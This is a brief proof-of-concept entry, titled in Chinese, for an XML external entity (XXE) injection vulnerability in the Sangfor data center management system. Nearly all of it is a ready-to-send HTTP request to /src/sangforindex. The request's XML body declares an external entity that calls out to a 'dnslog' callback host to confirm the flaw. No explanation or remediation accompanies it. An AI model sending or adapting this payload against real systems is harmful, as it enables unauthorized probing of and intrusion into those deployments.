## 深信服数据中心管理系统 XML 实体注入漏洞
```
GET /src/sangforindex HTTP/1.1
Host: ip:port
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko)
Accept:
text/xml,application/xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Content-Type: text/xml
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: Keep-alive
Content-Length: 135
<?xml version="1.0" encoding="utf-8" ?><!DOCTYPE root [
<!ENTITY rootas SYSTEM "http://dnslog">
]>
<xxx>
&rootas;
</xxx>

```
